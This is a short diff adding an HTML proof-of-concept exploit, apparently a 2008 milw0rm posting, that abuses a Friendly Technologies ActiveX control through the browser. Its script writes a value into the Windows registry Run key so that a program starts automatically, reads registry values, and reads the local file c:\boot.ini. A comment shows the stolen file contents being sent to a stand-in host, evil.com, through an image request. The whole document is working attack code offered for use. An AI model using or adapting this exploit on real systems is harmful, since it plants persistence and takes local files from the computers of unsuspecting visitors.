@@ -1,0 +1,26 @@
+<!-- 
+Proof of Concept...
+Read write to registry
+and also read files
+
+More codes at irc.nix.co.il/#binaryvision !
+-->
+
+<html>
+<title>Friendly Technologies - Read/Write Registry</title>
+<object classid="clsid:F4A06697-C0E7-4BB6-8C3B-E01016A4408B" id='FT'></object>
+
+<script language='Javascript'>
+// Write to Registry
+FT.RegistryValue (1, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Key Name Here", 1) = "Input Here";
+
+// Read from Registry
+var readreg = FT.RegistryValue (1, "SOFTWARE\\Friendly Technologies\\FriendlyWeb Dialer", "Version", 1);
+alert(readreg);
+
+// Read from file
+var readme=FT.GetTextFile("c:\\boot.ini");
+alert(readme); // <img src="http://evil.com/postfiles.php?input="+readme ...
+</script>
+
+# milw0rm.com [2008-08-30]
